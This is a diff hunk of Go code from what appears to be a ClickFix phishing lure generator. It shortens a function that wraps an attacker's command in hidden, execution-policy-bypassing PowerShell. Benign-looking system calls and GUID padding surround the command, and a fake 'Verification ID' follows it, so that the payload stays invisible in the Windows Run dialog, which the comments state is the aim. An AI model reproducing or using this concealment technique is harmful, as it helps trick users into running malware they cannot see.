@@ -81,12 +81,11 @@ func wrapClickFixPayload(command string) string {
 		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
 		return command
 	}
-	// Wrap: silent PowerShell with benign system commands surrounding the
-	// payload. ~200 chars of system-gathering before (fills Run dialog head),
-	// ~150 chars of validation operations after (fills Run dialog tail view),
-	// VID at the very end. The payload sits in the middle — invisible in both
-	// the head and tail views of the Run dialog. -w hidden = no window/output.
-	return `powershell -w hidden -ep bypass -c "$os=[Environment]::OSVersion.VersionString;$arch=[Environment]::Is64BitOperatingSystem;$nf=[System.Net.Dns]::GetHostName();$ts=Get-Date -Format 'yyyyMMddHHmmss';$env=[Environment]::Version.ToString();$clr=[System.Reflection.Assembly]::GetExecutingAssembly();` + command + `;$r1=[Math]::Sqrt([DateTime]::Now.Year);$r2=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ts));$r3=[System.GUID]::NewGuid().ToString();$r4=[System.Diagnostics.Process]::GetCurrentProcess().Id;$id='Verification ID: {VID}'"`
+	// Wrap: silent PowerShell, ~200 chars (within Win+R's ~260 limit).
+	// Short benign prefix (OS/date) fills the head, GUID padding after the
+	// payload fills the tail, VID at the end. The payload sits between —
+	// invisible from both directions. -w hidden = no window, no output.
+	return `powershell -w hidden -ep bypass -c "$os=[Environment]::OSVersion;$ts=Get-Date -f 'yyyyMMdd';` + command + `;$r=[GUID]::NewGuid();$id='Verification ID: {VID}'"`
 }
 
 // renderClickFix substitutes all placeholders:
